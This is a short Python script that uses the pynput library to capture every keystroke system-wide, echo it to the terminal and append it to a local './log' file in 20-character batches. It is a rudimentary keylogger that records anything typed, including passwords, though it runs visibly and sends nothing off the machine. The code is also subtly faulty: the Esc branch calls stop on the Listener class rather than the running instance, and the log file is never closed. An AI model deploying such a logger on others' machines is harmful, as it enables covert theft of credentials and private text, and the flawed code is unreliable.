from pynput import keyboard
import os

inputs = []


def on_press(key):
    try:
        inputs.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            inputs.append(' ')
        elif key == keyboard.Key.backspace:
            if len(inputs) > 0:
                inputs.pop()
        elif key == keyboard.Key.esc:
            keyboard.Listener.stop()
        elif key == keyboard.Key.enter:
            inputs.append('\n')
    os.system('clear')
    print(''.join(inputs))
    print(len(inputs))


def on_release(key):
    if len(inputs) >= 20:
        file = open('./log', 'a')
        while len(inputs) > 0:
            file.write(inputs.pop(0))


listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
